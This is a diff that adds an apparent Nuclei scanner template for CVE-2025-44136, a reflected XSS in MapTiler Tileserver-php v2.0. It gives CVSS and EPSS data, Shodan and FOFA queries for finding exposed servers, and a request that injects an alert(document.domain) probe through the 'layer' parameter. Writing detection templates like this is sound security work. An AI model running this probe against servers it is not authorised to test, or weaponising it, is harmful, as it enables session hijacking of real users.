@@ -1,0 +1,42 @@
+id: CVE-2025-44136
+
+info:
+  name: "MapTiler Tileserver-php v2.0 未授权反射型XSS漏洞"
+  author: 0x_Akoko
+  severity: medium
+  description: |
+    MapTiler Tileserver-php v2.0 contains a reflected XSS caused by unencoded reflection of the GET parameter \"layer\" in an error message, letting unauthenticated attackers execute arbitrary script on victim browsers.
+  impact: |
+    Unauthenticated attackers can execute arbitrary JavaScript in victim browsers, leading to session hijacking or phishing.
+  remediation: |
+    Update to the latest version of MapTiler Tileserver-php.
+  reference:
+    - https://nvd.nist.gov/vuln/detail/CVE-2025-44136
+    - https://github.com/mheranco/CVE-2025-44136
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
+    cvss-score: 6.1
+    cve-id: CVE-2025-44136
+    epss-score: 0.32052
+    epss-percentile: 0.96587
+    cwe-id: CWE-79
+  metadata:
+    verified: true
+    max-request: 1
+    shodan-query: title:"TileServer-php"
+    fofa-query: title="TileServer-php"
+  tags: maptiler,tileserver
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/tileserver.php/wmts/x/1/1/asd?Request=x&layer=%3Csvg+alert(document.domain)%3E"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains_all(body, "<svg alert(document.domain)>","Unknown or not specified dataset")'
+          - 'contains(content_type, "text/html")'
+          - 'status_code == 404'
+        condition: and
+# digest: 4b0a004830460221009e80c950aad6fdaa29e7a29266a9abef845b243cd246e08adc3cf0e54937287e022100ac4755a0445b8a53cbff20a3a7d9bf6b1e6b263d37297c5de1f28b28eec8b5f2:922c64590222798bb761d5b6d8e72950
